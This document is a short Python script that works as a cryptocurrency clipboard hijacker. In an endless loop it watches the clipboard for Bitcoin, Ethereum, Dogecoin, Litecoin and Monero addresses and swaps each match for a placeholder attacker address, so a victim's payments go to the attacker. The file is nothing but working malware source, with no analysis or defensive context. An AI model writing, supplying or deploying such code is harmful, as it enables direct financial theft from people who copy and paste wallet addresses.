import pyperclip
import re

BTC_address = "btc address here"
ETH_address = "eth address here"
DOGE_address = "doge address here"
LTC_address = "ltc address here"
XMR_address = "xmr address here"

def match():
    clipboard = str(pyperclip.paste())
    btc_match_1 = re.match("^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}$", clipboard)
    btc_match_2 = re.match("^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$", clipboard)
    eth_match = re.match("^0x[a-zA-F0-9]{40}$", clipboard)
    doge_match = re.match("^D{1}[5-9A-HJ-NP-U]{1}[1-9A-HJ-NP-Za-km-z]{32}$", clipboard)
    ltc_match = re.match("^([LM3]{1}[a-km-zA-HJ-NP-Z1-9]{26,33}||ltc1[a-z0-9]{39,59})$", clipboard)
    xmr_match = re.match("^[48][0-9AB][1-9A-HJ-NP-Za-km-z]{93}$", clipboard)

    if btc_match_1 or btc_match_2:
        pyperclip.copy(BTC_address)
    elif eth_match:
        pyperclip.copy(ETH_address)
    elif doge_match:
        pyperclip.copy(DOGE_address)
    elif  ltc_match:
        pyperclip.copy(LTC_address)
    elif xmr_match:
        pyperclip.copy(XMR_address)

while True:
    match()